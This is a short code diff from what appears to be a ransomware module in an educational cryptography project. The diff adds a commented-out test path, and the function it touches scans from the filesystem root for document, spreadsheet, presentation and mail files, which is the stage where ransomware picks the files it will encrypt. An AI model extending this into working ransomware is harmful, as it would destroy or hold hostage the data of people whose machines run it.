@@ -1,6 +1,7 @@
 import os
 
 def find_files_clear():
+    #path = '/home/yass/CryptoBook/src/ransomware/test/'
     path = '/'
     extensions = ['.doc','.data','.docx','.txt','.xlsx','.pptx','.mail','.mail']
     files = []
